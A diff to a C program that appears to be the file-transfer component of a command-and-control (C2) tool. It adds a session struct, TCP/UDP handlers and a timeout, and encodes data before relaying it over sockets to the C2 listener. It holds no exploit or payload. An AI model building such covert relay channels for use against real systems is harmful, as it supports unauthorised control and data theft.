@@ -11,14 +11,23 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include "../headers/encoder.h"
-#include "../headers/packetCrafter.h"
-#include "../headers/sessionHandler.h"
+#include "../headers/udpHandler.h"
+#include "../headers/tcpHandler.h"
 
 #define TOTAL_SOCKETS 1001 // Total number of sockets you want to create, should be (high port) - (low port) + 1
 #define LOW_PORT 16000	// Lowest port to use
 #define MAX_SIZE 1450	// Maximum expected message size
+#define TIMEOUT 2000	// timeout for sockets
 
 void * transferSession(void * in);
+typedef struct Session{
+	int sport;	// Port on the C2
+	int dport;	// Port on the FTS
+	unsigned char * packet;	// 0x00 packet contents
+	char * saddr;	// C2 Address
+	int size;	// Size of the packet
+	int sockNum;	// Index of the FD for this session
+} session;
 
 pthread_mutex_t sockets_lock;
 int * sockets;
@@ -122,7 +131,6 @@ int main(int argc, char ** argv){
 
 // Function called to send the type 0x01 message, receive the 0x02 message, send the 0x03 message, and conduct the TCP data transfer
 void * transferSession(void * in){
-	printf("started\n");
         session * s = (session *) in;
         // Grab some admin info
         int ctwoPort = s->sport;
@@ -346,14 +354,14 @@ void * transferSession(void * in){
 	int sent = 0;
 	while (sent < totalrcvd){
 		int read = fread(raw,sizeof(unsigned char),MAX_SIZE,tmp);
-		int pktSize = send(ctwoListenSock,raw,read,0);
+		int pktSize = send(ctwoListenSock,encode(raw,parsed),read,0);
 		if (pktSize != read){
 			perror("Send Error");
 		}
 		sent += pktSize;
 		memset(&raw[0],0,read);
 	}
-	printf("done\n");
+	close(ctwoListenSock);
 	pthread_mutex_lock(&sockets_lock);
 	sockets[socketsIndex] = sock;
 	pthread_mutex_unlock(&sockets_lock);
